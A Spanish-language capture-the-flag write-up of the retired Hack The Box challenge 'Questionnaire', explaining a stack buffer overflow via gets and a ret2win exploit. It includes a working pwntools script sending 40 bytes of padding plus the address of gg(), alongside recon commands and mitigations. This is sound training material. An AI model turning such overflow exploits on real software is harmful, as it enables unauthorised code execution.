---
challenge: Questionnaire
type: Pwn
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, ret2win, no-pie]
---

# Questionnaire — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

El binario pide respuestas, pero el fallo real es un `gets` en `vuln`: 40 bytes hasta RIP y una función `gg()` que ejecuta `cat flag.txt`. Sin PIE, la dirección de `gg` es fija.

## Enunciado y superficie

- Pwn, Very Easy, retirado.
- Se entrega un ELF de 64 bits.
- El enunciado simula un cuestionario.

```bash
file pwn
checksec ./pwn
```

## Reconocimiento

```bash
chmod +x pwn
./pwn
objdump -d -M intel pwn | grep -A5 '<vuln>'
```

- Sin canario, NX y sin PIE.
- `gets` lee sin límite en `vuln`.
- `gg` llama a `system("cat flag.txt")`.

## Análisis del código

La pila reserva 32 bytes para el buffer y otros 8 para variables locales. El retorno queda a 40 bytes del inicio. `gets` permite sobrescribirlo.

## Explicación del fallo

Un desbordamiento de pila clásico: se envía relleno hasta el offset 40 y se escribe la dirección de `gg`. No hace falta ROP porque la función objetivo ya existe y no hay PIE.

## Reproducción local

```bash
gdb -q ./pwn
pattern create 100
run
pattern offset $rsp
```

- Confirmar el offset con un patrón cíclico.
- Verificar la dirección de `gg` con `info functions gg`.
- Probar el payload en local antes de lanzarlo remoto.

## Explotación

```python
from pwn import *
elf = context.binary = ELF('./pwn')
p = process()
p.sendline(b'A' * 40 + p64(elf.sym.gg))
p.interactive()
```

Para remoto, cambiar `process()` por `remote('<IP>', <PORT>)`. La flag se redacta.

## Evidencia

- `checksec` sin canario y sin PIE.
- Desensamblado de `vuln` y `gg`.
- Offset de 40.
- Ejecución local con la flag redactada.

## Lecciones aprendidas

- `gets` sigue siendo un fallo directo.
- Un ret2win evita construir una cadena ROP.
- Comprobar PIE antes de elegir direcciones.

## Mitigaciones y detección

- Sustituir `gets` por `fgets` con longitud.
- Compilar con canario, PIE y NX.
- Monitorizar caídas por SIGSEGV y payloads largos.

## Referencias

- <https://www.hackthebox.com/challenges/Questionnaire>
- <https://attack.mitre.org/techniques/T1203/>
